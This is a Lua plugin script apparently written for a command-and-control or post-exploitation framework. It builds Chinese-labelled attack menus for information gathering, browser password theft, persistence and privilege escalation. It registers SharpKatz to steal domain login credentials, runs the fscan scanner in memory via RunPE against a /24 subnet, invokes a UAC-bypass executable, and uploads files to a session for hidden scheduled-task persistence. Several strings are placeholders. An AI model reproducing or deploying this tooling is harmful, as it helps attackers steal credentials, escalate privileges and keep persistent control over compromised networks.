local function SchTaskForm()
    local IsOK = false
    local Form1 = CreateForm("sch", 422, 355)

    local Label1 = Addlabel(Form1, "Interval(min):", 17, 33, 133, 25)
    local Label2 = Addlabel(Form1, "Select File:", 31, 103, 114, 25)
    local Label3 = Addlabel(Form1, "Directory:", 28, 174, 114, 25)

    local addButton = AddSelectFileButton(Form1, "Select", 162, 100, 181, 33)
    local texBox1 = AddTextBox(Form1, 162, 31, 181, 33)
    local ComBox1 = AddComBox(Form1, 162, 174, 181, 33)
    local Button1 = AddButton(Form1, "Ok", 36, 234, 106, 37, function()
        if texBox1.Text ~= "" and ComBox1.Text ~= "" and addButton.Text ~=
            "Select" then -- The values of texBox1 and ComBox1 can't be empty strings, otherwise this window
            IsOK = true
            Form1:Hide()

        else
            IsOK = false
            MessageBoxA("adas")
        end
    end)

    local Button2 = AddButton(Form1, "close", 236, 234, 107, 37,
                              function() Form1:Close() end)
    Form1:ShowDialog()
    if IsOK then
        local FileName = GetFileName(addButton.Text)
        local UploadFilePath = ComBox1.Text .. "\\" .. FileName
        Upload(UploadFilePath, addButton.Text)
        -- InlineAssembly("Plugins\\BypassUAC-ETV.exe", "Plugins\\BypassUAC-ETV.exe", texBox1.Text)
    end
end


AddCommand(
    "SharpKatz",
    "Plugins\\SharpKatz.exe", --FilePath
    "execute-assembly",
    "Steal domain login credentials",
    "SharpKatz -h"
)
AddCommand(
    "fscan",
    "Plugins\\fscan.bin",
    "RunPE",
    "asdasd",
    "DDDDD"
)
AttackMenuExpand("asdasd","",null)
MenuStripExpand("asdasd",null,null)


local function Privileg()
    InlineAssembly("Plugins\\BypassUAC-ETV.exe", "calc")
end

local function RunPEload()
    RunPE("Plugins\\fscan.bin","-h 192.168.1.1/24")
    -- 调用C#中注册的printf方法
    Sessionlog("Message")
end

local function AddMenuItem()

    AddMenuItemA("渗透插件", null)
    AddMenuItemA("信息收集", null)
    AddMenuItemA("抓取浏览器密码", null)
    AddMenuItemA("持久化控制", null)
    AddMenuItemA("任务计划", null)
    AddMenuItemB("隐藏安装", "", SchTaskForm)
    AddMenuItemB("权限提升",null,function ()
        Sessionlog("Message")
    end)
    AddMenuItemB("4.0","",RunPEload)
    local menuStructure = {
        ["渗透插件"] = {"信息收集", "持久化控制","权限提升"},
        ["信息收集"] = {"抓取浏览器密码"},
        ["持久化控制"] = {"任务计划"},
        ["任务计划"] = {"隐藏安装"},
        ["权限提升"] = {"4.0"}
    }
    for parent, subs in pairs(menuStructure) do
        AddMenuItemsAsSubItems(parent, subs)
    end
end


AddMenuItem()